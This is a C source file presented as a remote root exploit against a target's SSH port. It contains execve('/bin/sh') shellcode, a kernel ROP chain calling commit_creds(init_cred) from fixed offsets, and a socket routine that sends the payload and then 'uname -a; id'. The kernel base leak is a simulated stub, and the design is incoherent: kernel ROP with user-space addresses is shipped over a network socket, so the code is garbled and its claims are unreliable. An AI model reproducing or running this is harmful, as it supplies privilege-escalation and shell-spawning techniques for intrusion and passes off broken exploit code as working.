#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <fcntl.h>

// Dummy shellcode usermode (execve /bin/sh)
unsigned char shellcode[] =
    "\x48\x31\xc0"                          // xor rax, rax
    "\x50"                                  // push rax
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov rbx, "//bin/sh"
    "\x53"                                  // push rbx
    "\x48\x89\xe7"                          // mov rdi, rsp
    "\x50"                                  // push rax
    "\x57"                                  // push rdi
    "\x48\x89\xe6"                          // mov rsi, rsp
    "\xb0\x3b"                              // mov al, 59 (execve)
    "\x0f\x05";                             // syscall

#define PUSH64(x) do { \
    *(unsigned long *)(payload + payload_offset) = (unsigned long)(x); \
    payload_offset += 8; \
} while(0)

unsigned long kern_base = 0;

// Dummy kernel base leak simulasi
unsigned long leak_kernel_base() {
    printf("[*] Leak kernel base simulated\n");
    return 0xffffffff81000000;
}

void build_rop_payload(char *payload, size_t *payload_len, unsigned long user_rip) {
    size_t payload_offset = 0;

    unsigned long raw_proto_abort = kern_base + 0x2efa8c0;
    unsigned long null_ptr = kern_base + 0x2eeaee0;
    unsigned long init_cred = kern_base + 0x2c74d80;
    unsigned long pop_r15_ret = kern_base + 0x15e93f;
    unsigned long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;
    unsigned long pop_rdi_ret = kern_base + 0x15e940;
    unsigned long commit_creds = kern_base + 0x1fcc40;
    unsigned long ret = kern_base + 0x5d2;
    unsigned long swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;

    unsigned long user_cs = 0x33;
    unsigned long user_ss = 0x2b;
    unsigned long user_rflags = 0x202;

    printf("[*] Building ROP chain...\n");

    // Build ROP chain:
    PUSH64(pop_rdi_ret);
    PUSH64(init_cred);
    PUSH64(ret);
    PUSH64(ret);
    PUSH64(pop_r15_ret);
    PUSH64(raw_proto_abort);
    PUSH64(ret);
    PUSH64(commit_creds);
    PUSH64(swapgs_restore_regs_and_return_to_usermode);
    PUSH64(null_ptr);              // rax
    PUSH64(null_ptr);              // rdi
    PUSH64(user_rip);              // RIP: eksekusi shellcode usermode
    PUSH64(user_cs);
    PUSH64(user_rflags);
    PUSH64((unsigned long)(payload + 0x400)); // Usermode stack (payload buffer sebagai stack)
    PUSH64(user_ss);
    PUSH64(push_rbx_pop_rsp_ret);

    *payload_len = payload_offset;
}

int connect_target(const char *ip, int port) {
    struct sockaddr_in addr;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if(inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(1);
    }

    printf("[*] Connecting to %s:%d ...\n", ip, port);
    if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sockfd);
        exit(1);
    }
    printf("[*] Connected.\n");
    return sockfd;
}

void exploit(int sock) {
    char payload[1024] = {0};
    size_t payload_len = 0;

    kern_base = leak_kernel_base();

    // Bangun ROP chain dengan user RIP yang menunjuk ke shellcode dalam buffer payload + 0x400
    build_rop_payload(payload, &payload_len, (unsigned long)(payload + 0x400));

    // Copy shellcode usermode di payload + 0x400
    memcpy(payload + 0x400, shellcode, sizeof(shellcode)-1);

    // Total ukuran payload = ROP chain + shellcode
    size_t total_len = payload_len + sizeof(shellcode) - 1;

    printf("[*] Sending exploit payload (%zu bytes)...\n", total_len);

    ssize_t sent = send(sock, payload, total_len, 0);
    if(sent < 0) {
        perror("send");
        close(sock);
        exit(1);
    }
    printf("[*] Payload sent (%zd bytes)\n", sent);

    sleep(1);
    printf("[*] Trying to spawn shell...\n");

    // Kirim perintah uname -a dan id ke shell
    char cmd[] = "uname -a; id\n";
    send(sock, cmd, strlen(cmd), 0);

    char buff[512];
    ssize_t n;
    while ((n = recv(sock, buff, sizeof(buff)-1, 0)) > 0) {
        buff[n] = 0;
        printf("%s", buff);
        if(n < (ssize_t)sizeof(buff)-1) break;
    }
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <port_ssh>\n", argv[0]);
        exit(1);
    }

    if(geteuid() != 0) {
        fprintf(stderr, "[-] You must run this program as root.\n");
        exit(1);
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    int sock = connect_target(target_ip, port);

    exploit(sock);

    close(sock);
    return 0;
}
